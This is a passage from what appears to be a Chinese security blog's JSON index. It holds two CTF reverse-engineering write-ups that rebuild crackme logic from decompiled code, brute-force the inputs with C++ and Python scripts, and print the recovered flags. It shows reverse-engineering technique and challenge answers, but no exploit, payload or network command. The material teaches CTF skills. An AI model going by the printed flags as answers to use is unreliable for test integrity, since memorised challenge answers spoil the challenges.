第五个函数尤为关键，跟第一个函数一样决定了能不能夺得flag。传入8个字节异或后的结果，每字节不能打大于9且要满足7个判断语句。这里按照它的逻辑把八位数爆出来就行了，但是一开始用python写的脚本一堆问题，整得我在比赛结束前没做出来。最后用c++写下就搞出来了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128#include&lt;iostream&gt;#include&lt;string&gt;#include&lt;ios&gt;using namespace std;long long int dword_40F020 = 0x8A;long long int dword_40F024 = 0x01A1;long long int dword_40F028 = 0x012A;long long int dword_40F02C = 0x0269;long long int dword_40F030 = 0x0209;long long int dword_40F034 = 0x68;long long int dword_40F038 = 0x039F;long long int dword_40F03C = 0x02C8;long long int dword_40F040 = 0x00FF;int test(int v);void flag(int v);int main(){ int v = 0; int i; for (i = 10000000; i &lt;= 99999999; ++i) { int j = i; while (j != 0) { if (test(j % 10) == 1) { cout &lt;&lt; i &lt;&lt; endl; flag(i); return 0; } j /= 10; } dword_40F020 = 0x8A; dword_40F024 = 0x01A1; dword_40F028 = 0x012A; dword_40F02C = 0x0269; dword_40F030 = 0x0209; dword_40F034 = 0x68; dword_40F038 = 0x039F; dword_40F03C = 0x02C8; dword_40F040 = 0x00FF; } return 0;}int test(int v){ int result = 0; switch (v) { case 0: dword_40F028 &amp;= dword_40F038; dword_40F02C *= dword_40F028; goto LABEL_4; case 1: if (!dword_40F02C) goto LABEL_6; dword_40F028 /= dword_40F02C; dword_40F024 += dword_40F034; goto LABEL_4; case 2: dword_40F030 ^= dword_40F034; dword_40F03C += dword_40F020; goto LABEL_4; case 3: dword_40F03C -= dword_40F030; dword_40F030 &amp;= dword_40F024; goto LABEL_4; case 4: dword_40F034 *= dword_40F020; dword_40F02C -= dword_40F038; goto LABEL_4; case 5: dword_40F020 ^= dword_40F02C; dword_40F038 -= dword_40F03C; goto LABEL_4; case 6: if (!dword_40F03C) goto LABEL_6; dword_40F034 |= dword_40F024 / dword_40F03C; dword_40F024 /= dword_40F03C; goto LABEL_4; case 7: dword_40F038 += dword_40F028; dword_40F034 |= dword_40F024; goto LABEL_4; case 8: dword_40F020 *= dword_40F02C; dword_40F030 -= dword_40F03C; goto LABEL_4; case 9: dword_40F028 += dword_40F034; dword_40F02C ^= dword_40F030; LABEL_4: result = ((dword_40F038 == 231) + (dword_40F034 == 14456)+ (dword_40F030 == 14961)+ (dword_40F02C == -13264)+ (dword_40F028 == 16)+ (dword_40F024 == 104)+ (dword_40F020 == -951) == 7); if (dword_40F03C != -239) goto LABEL_6; break; default: LABEL_6: return 0; break; } return result;}void flag(int v){ int a[] = { 0x7C,0xAB,0x2D,0x91,0x2F,0x98,0xED,0xA9 }; int j = 0; while (v) { for (int i = 0; i &lt;= 256; ++i) { if (v % 10 == (i ^ a[j])) { printf(\"%02x\", i); break; } } v /= 10; j += 1; }} 运行结果： 270594167aaa29982a98eaab 输入到题目文件中： Plz solve the puzzle: 7aaa29982a98eaabCongrats!flag{5cb92582-66a8-e5b7-d3bf-3b99df8ac7f0} 0X02总结 应当注意类型装换，以及转换后的字节大小 除了函数的返回值，还可以从参数的引用或指针获取结果 可以通过动态调试函数的结果得知函数的功能","link":"/2019/10/26/逆向学习笔记-上海全国大学生网络安全邀请赛-pluzz/"},{"title":"[逆向学习笔记]桂林电子科技大学“深信服杯”","text":"0x0number_game跟flag直接相关的就是这个函数。 1234567891011121314151617181920212223__int64 sub_400917(){ unsigned int v1; // [rsp+0h] [rbp-10h] signed int i; // [rsp+4h] [rbp-Ch] signed int j; // [rsp+8h] [rbp-8h] int k; // [rsp+Ch] [rbp-4h] v1 = 1; for ( i = 0; i &lt;= 4; ++i ) { for ( j = 0; j &lt;= 4; ++j ) { for ( k = j + 1; k &lt;= 4; ++k ) { if ( *(&amp;unk_601060 + 5 * i + j) == *(&amp;unk_601060 + 5 * i + k) ) v1 = 0; if ( *(&amp;unk_601060 + 5 * j + i) == *(&amp;unk_601060 + 5 * k + i) ) v1 = 0; } } } return v1;} 分析了一下，题目的要求就是补全一个硬编码在内存里的5x5矩阵，它的横竖不能有相同的数字。在根据前面只能输入0~5的数字，手动一下，很容易还原了矩阵。 得到还原出来的字符串，但这是通了前两个函数偏移的出来的矩阵。 123456789101112131415161718_QWORD *__fastcall sub_400758(__int64 cin, int offset, int a3){ _QWORD *v4; // rax _QWORD *v5; // ST28_8 int str_long; // [rsp+0h] [rbp-30h] char v7; // [rsp+1Fh] [rbp-11h] str_long = a3; v7 = *(offset + cin); if ( v7 == 32 || v7 == 10 || offset &gt;= a3 ) return 0LL; v4 = malloc(0x18uLL); v5 = v4; *v4 = v7; v4[1] = sub_400758(cin, 2 * offset + 1, str_long); v5[2] = sub_400758(cin, 2 * (offset + 1), str_long); return v5;} 12345678910111213__int64 __fastcall sub_400807(__int64 a1, __int64 a2){ __int64 result; // rax result = a1; if ( a1 ) { sub_400807(*(a1 + 8), a2); *(a2 + dword_601080++) = *a1; result = sub_400807(*(a1 + 16), a2); } return result;} 看来出题人很喜欢递归啊！！！这递归看得眼花缭乱。 庆幸的是偏移与输入内容无关。输入0123456789，再patch一下ZF，就能得出原字符串和偏移后的字符串。 整个python脚本跑一跑即可得到flag。 12345678910ch = '7381940526'code = '0421421430'flag = ['','','','','','','','','','']for i in xrange(10): flag[ord(ch[i])-ord('0')]=code[i]print 'flag{'+''.join(flag)+'}'#flag{1134240024}","link":"/2019/05/23/逆向学习笔记-桂林电子科技大学“深信服杯”/"}],"tags":[{"name":"UAF","slug":"UAF","link":"/tags/UAF/"},{"name":"StackOverflow","slug":"StackOverflow","link":"/tags/StackOverflow/"},{"name":"SSTI","slug":"SSTI","link":"/tags/SSTI/"},{"name":"machineKey","slug":"machineKey","link":"/tags/machineKey/"},{"name":"XSS","slug":"XSS","link":"/tags/XSS/"},{"name":"SQL","slug":"SQL","link":"/tags/SQL/"},{"name":"update-motd","slug":"update-motd","link":"/tags/update-motd/"},{"name":"模板注入","slug":"模板注入","link":"/tags/模板注入/"},{"name":"HeapOverflow","slug":"HeapOverflow","link":"/tags/HeapOverflow/"},{"name":"IO_file","slug":"IO-file","link":"/tags/IO-file/"},{"name":"ORW","slug":"ORW","link":"/tags/ORW/"},{"name":"SUID","slug":"SUID","link":"/tags/SUID/"},{"name":"hackthebox","slug":"hackthebox","link":"/tags/hackthebox/"},{"name":"反序列化","slug":"反序列化","link":"/tags/反序列化/"},{"name":"JVM","slug":"JVM","link":"/tags/JVM/"},{"name":"HotSpot","slug":"HotSpot","link":"/tags/HotSpot/"},{"name":"shellcode","slug":"shellcode","link":"/tags/shellcode/"},{"name":"RMI","slug":"RMI","link":"/tags/RMI/"},{"name":"内存马","slug":"内存马","link":"/tags/内存马/"},{"name":"CAP","slug":"CAP","link":"/tags/CAP/"},{"name":"mprotect","slug":"mprotect","link":"/tags/mprotect/"},{"name":"ROP","slug":"ROP","link":"/tags/ROP/"},{"name":"NOPASSWD","slug":"NOPASSWD","link":"/tags/NOPASSWD/"},{"name":"脏牛","slug":"脏牛","link":"/tags/脏牛/"},{"name":"域","slug":"域","link":"/tags/域/"},{"name":"tomcat","slug":"tomcat","link":"/tags/tomcat/"},{"name":"Spring","slug":"Spring","link":"/tags/Spring/"},{"name":"ICMP","slug":"ICMP","link":"/tags/ICMP/"},{"name":"log4j","slug":"log4j","link":"/tags/log4j/"},{"name":"struts2","slug":"struts2","link":"/tags/struts2/"},{"name":"JNDI","slug":"JNDI","link":"/tags/JNDI/"}],"categories":[{"name":"PWN","slug":"PWN","link":"/categories/PWN/"},{"name":"CTF","slug":"CTF","link":"/categories/CTF/"},{"name":"靶机","slug":"靶机","link":"/categories/靶机/"},{"name":"代码审计","slug":"代码审计","link":"/categories/代码审计/"},{"name":"渗透测试","slug":"渗透测试","link":"/categories/渗透测试/"},{"name":"日常","slug":"日常","link":"/categories/日常/"},{"name":"逆向","slug":"逆向","link":"/categories/逆向/"}]}